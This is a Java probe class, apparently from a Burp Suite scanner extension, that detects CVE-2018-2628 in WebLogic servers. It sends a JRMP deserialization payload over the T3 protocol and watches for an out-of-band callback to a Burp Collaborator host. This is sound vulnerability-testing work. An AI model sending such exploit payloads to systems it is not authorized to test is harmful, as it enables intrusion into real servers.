package probes;

import burp.*;

import java.io.IOException;
import java.net.Socket;
import java.net.URL;
import java.util.regex.Pattern;

public class CVE_2018_2628 extends Probe {
    private static final String NAME = "CVE-2018-2628";
    private static final String SEVERITY = "High";
    private static String detail = "WebLogic has a T3 protocol vulnerability!";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        URL target = Utilities.helpers.analyzeRequest(requestResponse).getUrl();
        String pollPayload = Utilities.collaborator.generatePayload(true);
        boolean vulnerable = false;
        String result = "";
        try {
            Socket s = new Socket(target.getHost(), target.getPort());
            s.setSoTimeout(10);

            result = sendT3Payload(s, JRMPClient.getPayloadBytes(pollPayload, "activator"));
            s.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        for (IBurpCollaboratorInteraction interaction : Utilities.collaborator.fetchCollaboratorInteractionsFor(pollPayload)) {
            detail = detail + "<br/>"
                    + "Receive a " + interaction.getProperty("type")
                    + " query from " + interaction.getProperty("client_ip")
                    + " at " + interaction.getProperty("time_stamp");

            vulnerable = true;
        }

//        return result.contains("weblogic.jms.common.StreamMessageImpl") ? new WebLogicIssue(requestResponse, NAME, DETAIL, SEVERITY) : null;
        if (vulnerable) {
            return new WebLogicIssue(requestResponse, NAME, detail, SEVERITY);
        } else return null;
    }
}
